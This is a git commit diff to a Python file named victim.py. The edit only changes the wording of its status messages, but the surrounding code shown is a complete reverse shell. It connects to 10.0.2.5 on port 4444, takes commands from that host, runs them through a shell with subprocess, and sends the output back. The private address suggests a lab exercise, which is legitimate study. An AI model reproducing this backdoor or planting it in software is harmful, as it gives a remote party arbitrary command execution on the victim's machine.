0f9f8ad66807ac1be7cf496246da92976ef1d48f
albertuslaksana <89668012+albertuslaksana@users.noreply.github.com>
2023-03-07 23:50:01 -0600

    Update victim.py

--- victim.py
+++ victim.py
@@ -4,16 +4,16 @@ import subprocess
 REMOTE_HOST = '10.0.2.5' 
 REMOTE_PORT = 4444
 client = socket.socket()
-print("[-] Connection Initiating...")
+print("Connection Starting")
 client.connect((REMOTE_HOST, REMOTE_PORT))
-print("[-] Connection initiated!")
+print("Connection Made")
 
 while True:
-    print("[-] Awaiting commands...")
+    print("Awaiting commands")
     command = client.recv(1024)
     command = command.decode()
     op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
     output = op.stdout.read()
     output_error = op.stderr.read()
-    print("[-] Sending response...")
+    print("Sending response")
     client.send(output + output_error)
